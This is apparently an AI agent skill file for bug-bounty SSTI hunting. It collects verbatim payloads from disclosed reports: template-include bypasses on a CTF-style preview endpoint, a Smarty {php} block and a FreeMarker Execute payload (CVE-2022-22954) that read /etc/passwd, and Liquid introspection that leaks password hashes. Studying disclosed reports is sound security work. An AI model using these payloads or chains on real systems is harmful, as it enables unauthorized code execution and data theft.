---
name: hunter-l3-ssti
description: "Use when hunting SSTI on a target. Loads the L3 technique sheet: Server-Side Template Injection is the injection of template-engine syntax into user-controlled input that is rendered server-side."
domain: cybersecurity
subdomain: web
tags:
- web
- ssti
- hunting
- l3
version: '1.0'
---

# SSTI — Technique Sheet

## Overview

Server-Side Template Injection is the injection of template-engine syntax into user-controlled input that is rendered server-side. In bug bounty, it pays when user data flows into a template render path — profile fields echoed into emails, preview/generator endpoints, and unpatched server software with known SSTI CVEs. Impact ranges from information disclosure (rendering restricted templates, reading files) to full RCE (Jinja2, Smarty, FreeMarker). The records below cluster into three main arenas: template-preview "sandbox" features (HacktoberCTF-style hate-mail generator), profile fields reflected into outbound email, and known-CVE components.

## Distinct sub-patterns

### 1. Double-evaluation / variable-carrying payload (preview_markup + preview_data)

The single largest cluster (12+ reports). The endpoint accepts markup plus a data JSON; data values get substituted into the markup, and the combined string is then evaluated as a template — so an access-check on the first pass misses the directive smuggled inside a variable.

- Endpoint shape: `POST /hate-mail-generator/new/preview` with params `preview_markup` and `preview_data` (URL-encoded or raw).
- Payloads that fired (verbatim):
  - `preview_markup=Hello {{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}` (id=1068880)
  - `preview_markup=Hello+{{test}}+&preview_data={"test":"{{template:38dhs_admins_only_header.html}}}"}` (id=1068934)
  - `preview_markup={{name}} preview_data={"name":"{{template:38dhs_admins_only_header.html}}}"}` (id=1069039)
  - URL-encoded variant (id=1069189): `preview_markup=Hello+%7B%7Bname%7D%7D+....&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22...`
- Root cause: preview_data values are interpolated into the markup before template directives are parsed; the engine resolves variables a second time, so a `{{template:...}}` tag inside a variable is evaluated despite the access check applied to direct template requests.
- Impact proven: rendered the admin-only template `38dhs_admins_only_header.html`, disclosing `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`.
- Exemplars: id=1069039, id=1069189, id=1068880.

### 2. Direct `{{template:...}}` injection into the markup param

When the markup itself isn't access-checked at the engine level, a plain include works.

- Endpoint shape: same preview endpoint; payload in `preview_markup` (or in a rendered `name` field).
- Payloads (verbatim): `{{template:38dhs_admins_only_header.html  }}` (id=1065583, note trailing spaces inside the braces); `{{template: 38dhs_admins_only_header.html}}` (id=1067835, space after the colon); plain `{{template:38dhs_admins_only_header.html}}` (id=1069392).
- Root cause: the template engine processes user-controlled `{{template:...}}` strings with no allowlist / access control at the engine layer.
- Impact: same admin-template disclosure + flag.
- Exemplars: id=1065583, id=1067835.

### 3. Injection via the JSON data fields alone (no markup param touched)

The data JSON's keys/values are rendered as templates themselves.

- Payloads (verbatim):
  - `{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}` (id=1066203)
  - `{"flag":"{{template:38dhs_admins_only_header.html}}}"}` (id=1066504)
  - `{"payload":"{{template:38dhs_admins_only_header.html}}}"}` in `preview_markup` of a campaign preview (id=1069141) — markup was `{{payload}}`.
- Root cause: preview_data (and similarly-named fields) are recursively rendered as template directives.
- Impact: same restricted-template read.
- Exemplars: id=1066203, id=1066504, id=1069141.

### 4. Recursive inclusion to bypass a direct-access restriction

When `{{template:38dhs_admins_only_header.html}}` directly is denied, launder it through a variable: define the include as a data value, then reference that variable from the markup.

- Payload (verbatim, id=1067443): `preview_markup={{givetemplate}}&preview_data={"name":"Alice","givetemplate":"{{template:38dhs_admins_only_header.html}}"}`
- Related pure-variable form (id=1068434): payload `{{name}}` with the directive placed in the name variable after direct inclusion was denied.
- Root cause: recursion — the access check runs on the top-level markup, not on content that materializes during variable substitution.
- Impact: restricted template loaded through the preview; flag retrieved.
- Exemplars: id=1067443, id=1068434.

### 5. Self-test detection payloads (arithmetic evaluation probes)

- Endpoint shapes: profile/registration fields that feed server-side email templates.
  - Glovo `POST /register`, First Name: `{{7*7}}` → welcome email subject rendered "49, welcome to Glovo!" (id=1104349).
  - Uber `POST /profile` name (rider.uber.com): `{{ '7'*7 }}` → account-update email showed "7777777" (id=125980). Jinja2 string-multiply syntax also fingerprinted the engine.
- Root cause: user field embedded into a Jinja2-rendered email without sanitization.
- Impact: confirmed evaluation. Uber's report went further — class-enumeration and code-writing payloads worked, with RCE limited only by an input length cap.
- Exemplars: id=1104349, id=125980.

### 6. SSTI into outbound email as an exfil / RCE channel (Smarty `{php}`)

- Endpoint shape: Unikrn profile fields (`firstname`, `lastname`, `nickname`) rendered into an invite email sent to another user.
- Payload (verbatim): `{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}`
- Root cause: Smarty `{php}` tags in user-controlled fields are parsed and executed server-side when rendering the invitation email.
- Impact: arbitrary PHP execution; first 100 bytes of `/etc/passwd` dumped into the invite email (an exfiltration channel to the attacker).
- Chain seen: `{7*7}` probe → template error confirms Smarty → `{$smarty.version}` to fingerprint → `{php}` execution.
- Exemplar: id=164224.

### 7. SSTI via email-format fields reflected in-page (also client-side potential)

- Endpoint: `POST /reset_password/new`, param `email` (Acronis, id=1265344).
- Payload (verbatim): `sudo_bash{{8*8}}@wearehackerone.com`
- Root cause: email input reflected through a template without sanitization.
- Impact: payload reflected back in the page; self-DoS possible; report flagged likely AngularJS client-side template injection (potential XSS).
- Exemplar: id=1265344.

### 8. Known-CVE SSTI in server software (unauthenticated RCE)

- Endpoint: `GET /catalog-portal` on VMware Workspace ONE (U.S. DoD, id=1537694), redacted query parameter (deviceUdid).
- Payload (verbatim): `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`
- Root cause: unpatched CVE-2022-22954 in VMware Workspace ONE Access.
- Impact: unauthenticated RCE — `cat /etc/passwd` output returned in the HTTP response.
- Exemplar: id=1537694.

### 9. Engine-native file-read primitives (Twig LFI)

- Endpoint: Twig template rendering on `dev-ucrm-billing-demo.ubnt.com`, param `template` (Ubiquiti, id=301406).
- Payload: Twig template path-traversal payload to read local files (exact payload not stated in the record).
- Root cause: unrestricted local file inclusion exploitable through Twig templates.
- Impact: arbitrary file read on the demo host.
- Exemplar: id=301404 (record id=301406).

### 10. Sandbox-escape via Drop introspection (Liquid)

- Endpoint: Shopify Liquid notification/checkout templates (id=98259).
- Payloads (verbatim): `{{ methods | json }}`, `{{ systemu }}`, `{{ class }}`, `{{ to_yaml}}`
- Root cause: Liquid Drops exposed underlying Ruby methods/properties, allowing arbitrary no-argument instance method calls and object introspection that bypassed filtered/hidden fields.
- Impact: read hidden fields via `to_yaml` — including a hashed user password — and forced delivery of order mail to an attacker-controlled address.
- Exemplar: id=98259.

### 11. Reports lacking detail (recorded for coverage, not technique)

- Informatica marketplace domain (id=299241): template injection identified and resolved; endpoint/param/payload not stated.
- These confirm the class exists in the data but contribute no reusable pattern.

## Bypass / chain notes

- Access-check bypass via variable laundering: when a template name is blocked at the top level (`Direct template:38dhs_admins_only_header.html inclusion was denied`, id=1068434; "direct template request returned access denied", id=1069392), smuggle the directive inside a preview_data variable and reference it with `{{name}}` / `{{test}}` / `{{givetemplate}}`. Double evaluation does the rest (ids 1067443, 1068880, 1069039, 1069141, 1069189).
- Recon chain used repeatedly: enumerate `/hate-mail-generator/templates` directory listing → find the admin-only file (403 on direct access, id=1066851) → inject `{{template:...}}` through the preview. The listing step is what names the target.
- Whitespace/format variance still parses: `{{template:38dhs_admins_only_header.html  }}` (trailing spaces, id=1065583) and `{{template: 38dhs_admins_only_header.html}}` (inner space, id=1067835) both worked.
- Engine fingerprinting before escalation: `{7*7}` / `{$smarty.version}` for Smarty (id=164224); `{{7*7}}` vs `{{ '7'*7 }}` distinguishes generic vs Jinja2 (ids 1104349, 125980).
- Email as exfil channel: profile-field SSTI (Uber, Unikrn) renders into emails the attacker can receive (own account email or invite emails), turning blind server-side rendering into a read-back channel.
- Multi-step: CVE-2022-22954 is a single-request unauthenticated RCE — no chain needed (id=1537694).

## Gotchas / what NOT to do

- Don't stop at a reflected-but-unrendered payload: `{{8*8}}` in the Acronis report was reflected, not evaluated server-side — impact was self-DoS only. Confirm actual evaluation (arithmetic result) before claiming SSTI severity.
- Input length caps can gate full RCE even when code-writing payloads work (Uber, id=125980) — note the cap in your report rather than over-claiming.
- Direct access to a protected template returning 403 doesn't mean the engine enforces the check — the preview/variable path may bypass it entirely (multiple records).
- Data-JSON fields are as injectable as markup fields; testing only `preview_markup` misses sub-pattern 3.
- URL-encode payloads fully when embedding `{{ }}` and quotes in form bodies (id=1069189 shows the fully encoded form).
- Payloads not stated in records (Informatica, Ubiquiti's exact Twig string) — don't fabricate; test engine-appropriate primitives yourself.

## Real-world impact examples

- Flag/admin-template disclosure: `38dhs_admins_only_header.html` rendered via preview SSTI across ~14 records, flag `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`.
- Unauthenticated RCE: CVE-2022-22954 payload returned `/etc/passwd` contents in the HTTP response (id=1537694, U.S. Dept of Defense).
- PHP execution + file read: Smarty `{php}` ran `file_get_contents('/etc/passwd')` and dumped output into an invite email (id=164224, Unikrn).
- Jinja2 evaluation on Uber profile name: "7777777" in account email; class-enumeration and code-writing confirmed, RCE bounded only by length cap (id=125980).
- Hidden-data leak: Shopify Liquid Drop introspection (`{{ to_yaml}}`) exposed a hashed user password and enabled redirecting order mail to an attacker address (id=98259).
- Live proof-of-evaluation: Glovo welcome email subject rendered "49, welcome to Glovo!" from First Name `{{7*7}}` (id=1104349).